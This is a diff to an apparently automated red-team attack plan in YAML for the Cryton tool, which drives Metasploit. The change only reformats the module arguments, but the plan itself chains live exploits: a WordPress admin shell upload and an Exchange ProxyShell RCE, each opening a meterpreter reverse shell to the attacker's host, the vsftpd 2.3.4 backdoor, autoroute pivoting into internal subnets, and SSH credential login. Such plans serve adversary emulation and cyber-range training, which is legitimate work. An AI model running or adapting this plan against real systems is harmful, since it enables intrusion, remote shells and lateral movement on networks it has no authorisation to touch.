@@ -23,14 +23,12 @@ plan:
             create_named_session: session-to-wordpress
             module: metasploit
             module_arguments:
-              module_type: exploit
-              module: unix/webapp/wp_admin_shell_upload
-              module_options:
+              module_name: unix/webapp/wp_admin_shell_upload
+              datastore:
                 RHOSTS: {{ wordpress.host }}
                 USERNAME: {{ wordpress.username }}
                 PASSWORD: {{ wordpress.password }}
-              payload: php/meterpreter/reverse_tcp
-              payload_options:
+                PAYLOAD: php/meterpreter/reverse_tcp
                 LHOST: {{ cryton.host }}
           next:
             - type: result
@@ -44,9 +42,8 @@ plan:
           arguments:
             module: metasploit
             module_arguments:
-              module_type: post
-              module: multi/manage/autoroute
-              module_options:
+              module_name: multi/manage/autoroute
+              datastore:
                 CMD: add
                 SUBNET: {{ wordpress.subnet_ip }}
                 SESSION: $upload-php-shell|session_id
@@ -65,13 +62,13 @@ plan:
           arguments:
             create_named_session: session-to-ftp
             module: metasploit
+            # TODO: missing retries
+#            module_retries: 3
             module_arguments:
-              module_type: exploit
-              module: unix/ftp/vsftpd_234_backdoor
-              module_options:
+              module_name: unix/ftp/vsftpd_234_backdoor
+              datastore:
                 RHOSTS: {{ ftp.host }}
-              payload: cmd/unix/interact
-              module_retries: 3
+                PAYLOAD: cmd/unix/interact
           next:
             - type: result
               value: ok
@@ -84,9 +81,8 @@ plan:
           arguments:
             module: metasploit
             module_arguments:
-              module_type: post
-              module: multi/manage/autoroute
-              module_options:
+              module_name: multi/manage/autoroute
+              datastore:
                 CMD: add
                 SUBNET: {{ ftp.subnet_ip }}
                 SESSION: $upload-php-shell|session_id
@@ -106,13 +102,11 @@ plan:
             create_named_session: session-to-exchange
             module: metasploit
             module_arguments:
-              module_type: exploit
-              module: exploit/windows/http/exchange_proxyshell_rce
-              module_options:
+              module_name: exploit/windows/http/exchange_proxyshell_rce
+              datastore:
                 RHOSTS: {{ exchange.host }}
                 email: {{ exchange.email }}
-              payload: windows/x64/meterpreter/reverse_tcp
-              payload_options:
+                PAYLOAD: windows/x64/meterpreter/reverse_tcp
                 LHOST: {{ cryton.host }}
           next:
             - type: result
@@ -126,9 +120,8 @@ plan:
           arguments:
             module: metasploit
             module_arguments:
-              module_type: post
-              module: multi/manage/autoroute
-              module_options:
+              module_name: multi/manage/autoroute
+              datastore:
                 CMD: add
                 SUBNET: {{ exchange.subnet_ip }}
                 SESSION: $upload-php-shell|session_id
@@ -148,9 +141,8 @@ plan:
             create_named_session: session-to-ssh
             module: metasploit
             module_arguments:
-              module_type: auxiliary
-              module: scanner/ssh/ssh_login
-              module_options:
+              module_name: scanner/ssh/ssh_login
+              datastore:
                 RHOSTS: {{ ssh.host }}
                 USERNAME: {{ ssh.username }}
                 PASSWORD: {{ ssh.password }}
